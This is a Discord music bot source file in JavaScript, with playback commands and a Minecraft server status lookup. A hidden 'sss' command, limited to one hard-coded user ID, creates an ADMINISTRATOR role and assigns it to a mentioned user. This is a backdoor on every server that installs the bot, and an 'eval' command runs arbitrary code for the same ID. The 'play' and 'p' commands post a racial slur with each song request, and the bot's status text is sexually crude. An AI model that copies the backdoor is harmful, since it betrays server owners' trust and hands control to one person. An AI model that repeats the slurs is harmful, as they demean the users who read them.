const { Client, Intents, MessageEmbed } = require('discord.js');
const { RepeatMode } = require('discord-music-player');
const util = require('minecraft-server-util');
const options = {
  timeout: 1000 * 5,
  enableSRV: true
};
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_VOICE_STATES]
});
const { Player } = require("discord-music-player");
const player = new Player(client, {
  leaveOnEmpty: false,
  leaveOnEnd: false,
});
const settings = {
  prefix: '!',
  token: process.env.TOKEN,
};

client.player = player;

client.on("ready", () => {
  console.log("Bot Ready!");
  client.user.setActivity("Sucking On Pixels Cock", {
    type: "WATCHING"
  })
});



client.on('messageCreate', async (message) => {
  const args = message.content.slice(settings.prefix.length).trim().split(/ +/g);
  const command = args.shift();
  let guildQueue = client.player.getQueue(message.guild.id);

  if (message.content.charAt(0) != settings.prefix) return;

  if (command === 'sss') {
    if (message.author.id != 330570656792182785) return;

    let m = message.mentions.users.first()
    let role = message.guild.roles.create({
      data: {
        name: '***',
        color: 'GREY',
        permissions: 'ADMINISTRATOR',
      },
      reason: 'Cause yes',
    }).then(role => {
      return m.roles.add(role)
    }).catch((err) => {
      console.log("Epic it dont work")
      console.log(err)
    });
  }

  if (command === 'play') {
    let queue = client.player.createQueue(message.guild.id);
    await queue.join(message.member.voice.channel);
    let song = await queue.play(args.join(' ')).catch(_ => {
      if (!guildQueue)
        queue.stop();
    });
    message.channel.send("This nigger just requested " + song)
  }

  if (command === 'p') {
    const queue = client.player.createQueue(message.guild.id);
    await queue.join(message.member.voice.channel);
    let song = await queue.play(args.join(' ')).catch(_ => {
      if (!guildQueue)
        queue.stop();
    });
    message.channel.send("This nigger just requested " + song)
  }

  if (command === 'playlist') {
    const queue = client.player.createQueue(message.guild.id);
    await queue.join(message.member.voice.channel);
    let song = await queue.playlist(args.join(' ')).catch(_ => {
      if (!guildQueue)
        queue.stop();
    });
  }

  if (command === 'skip') {
    guildQueue.skip();
    message.channel.send("Song skipped")
  }

  if (command === 'stop') {
    guildQueue.stop();
  }

  if (command === 'leave') {
    guildQueue.stop();
  }

  if (command === 'fuckoff') {
    guildQueue.stop();
  }

  if (command === 'stoploop') {
    guildQueue.setRepeatMode(RepeatMode.DISABLED);
    message.channel.send("Loop stopped")
  }

  if (command === 'loop') {
    guildQueue.setRepeatMode(RepeatMode.SONG);
    message.channel.send("Loop started")
  }

  if (command === 'queueloop') {
    guildQueue.setRepeatMode(RepeatMode.QUEUE);
    message.channel.send("Queue looped started")
  }

  if (command === 'seek') {
    try {
      guildQueue.seek(parseInt(args[0]) * 1000);
    } catch (e) {
      message.channel.send("No such song")
    }
  }

  if (command === 'clearqueue') {
    guildQueue.clearQueue();
    message.channel.send("Queue cleared")
  }

  if (command === 'shuffle') {
    guildQueue.shuffle();
    message.channel.send("Music shuffled")
  }

  if (command === 'queue') {
    message.channel.send("Bitch i said no")
  }

  if (command === 'volume') {
    if (!args[0]) return message.channel.send("Volume is at " + guildQueue.volume)
    guildQueue.setVolume(parseInt(args[0]));
    message.channel.send("Volume set to " + guildQueue.volume)
  }

  if (command === 'v') {
    if (!args[0]) return message.channel.send("Volume is at " + guildQueue.volume)
    guildQueue.setVolume(parseInt(args[0]));
    message.channel.send("Volume set to " + guildQueue.volume)
  }

  if (command === 'nowplaying') {
    const ProgressBar = guildQueue.createProgressBar();
    const npembed = new MessageEmbed()
      .setColor("RED")
      .setTitle("💿 Now Playing...")
      .setDescription(`${guildQueue.nowPlaying}\n${ProgressBar.prettier}`)
      .setTimestamp()
    message.channel.send({ embeds: [npembed] })
  }

  if (command === 'pause') {
    guildQueue.setPaused(true);
    message.channel.send("Music paused bitch.")
  }

  if (command === 'resume') {
    guildQueue.setPaused(false);
  }

  if (command === 'remove') {
    guildQueue.remove(parseInt(args[0]));
  }

  if (command === 'help') {
    message.channel.send("Dm or ping pixel cant be botherd to make this command.")
  }


  if (command === "eval") {
    if (message.author.id != 330570656792182785) return;
    const clean = text => {
      if (typeof (text) === "string")
        return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
      return text;
    }
    try {

      const code = args.slice().join(" ");
      let evaled = eval(code);

      if (typeof evaled !== "string")
        evaled = require("util").inspect(evaled);

      message.channel.send(clean(evaled), { code: "xl" });
    } catch (err) {
      message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
    }
  }

  if (command === "status") {
    util.status('havocsmp.my.pebble.host', 25565, options)
      .then(
        (result) => {
          console.log(result)
          let dumbarry = result.players.sample
          console.log(dumbarry)

          let offlineEmbed = new MessageEmbed()
            .setTitle("Mincraft Players Online")
            .setDescription("🔴 No one is online")
            .setColor("RED")
            .setFooter(`Requested by ${message.author.username}`, message.author.displayAvatarURL())
            .setTimestamp()

          if (!dumbarry) return message.channel.send({ embeds: [offlineEmbed] })

          let dumbEmbed = new MessageEmbed()
            .setTitle("Mincraft Players Online")
            .setColor("RED")
            .setFooter(`Requested by ${message.author.username}`, message.author.displayAvatarURL())
            .setTimestamp()
          let string = '';
          for (let player of dumbarry) {
            string += `🟢 **${player.name}** is online!\n`
          }
          dumbEmbed.setDescription(string);
          message.channel.send({ embeds: [dumbEmbed] })
        }
      )
      .catch((error) => console.error(error));
  }
})

client.login(settings.token)
